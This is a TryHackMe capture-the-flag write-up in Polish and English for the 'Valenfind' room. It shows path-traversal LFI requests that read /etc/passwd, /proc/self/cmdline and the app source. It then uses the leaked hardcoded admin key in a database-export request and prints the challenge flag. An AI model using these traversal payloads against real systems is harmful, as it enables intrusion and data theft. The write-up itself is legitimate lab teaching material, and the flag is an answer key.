# Valenfind - TryHackMe CTF

Room: https://tryhackme.com/room/lafb2026e10

---

## 🇵🇱 Opis

Ten write-up przedstawia rozwiązanie wyzwania Valenfind na platformie TryHackMe.  
Podczas rozwiązywania zadania wykorzystano podatność typu LFI (Local File Inclusion), 
uzyskano dostęp do kodu źródłowego aplikacji, wyodrębniono klucz API administratora, 
a następnie wyeksportowano bazę danych w celu zdobycia flagi.

Wyzwanie pokazuje, jak pozornie niewielka podatność może prowadzić do pełnego kompromisu aplikacji.

---

## 🇬🇧 Description

This write-up explains how the Valenfind TryHackMe challenge was solved by exploiting a Local File Inclusion (LFI) vulnerability -(Local File Inclusion) is a web application vulnerability that allows an attacker to include or read files from the local server, accessing the application source code, extracting an admin API key, and exporting the database to retrieve the final flag.

The challenge demonstrates how a seemingly small vulnerability can lead to full application compromise.

---
## SOLUTION - STEP - BY - STEP

Create an account and review other user profiles. The “Profile Theme” feature contains an LFI vulnerability.


Change the theme and check Burp Proxy history:

Take the request to the repeater tab and try “/etc/passwd”, which works:

Next try: GET /api/fetch_layout?layout=/../../../../proc/self/cmdline, this tells us where is the main code which is being hosted:


Now, we can review the source code, and it has quite juicy info for our use:
GET /api/fetch_layout?layout=/../../../../opt/Valenfind/app.py :


Code of our use:


 Database name + key
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
DATABASE = 'cupid.db'

 How to use
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
Use this to view database and our flag:

GET /api/admin/export_db HTTP/1.1
Host: 10.49.179.17:5000
X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: */*
Accept-Language: en-GB,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://10.49.179.17:5000/profile/romeo_montague
Connection: keep-alive
Cookie: session=eyJsaWtlZCI6W10sInVzZXJfaWQiOjksInVzZXJuYW1lIjoiYWFzaHUifQ.aZGZBA.gUEH3TT2H8s1jfp11YLmYr5yMs8
Priority: u=4


We have a flag! 













## What is the flag?
THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
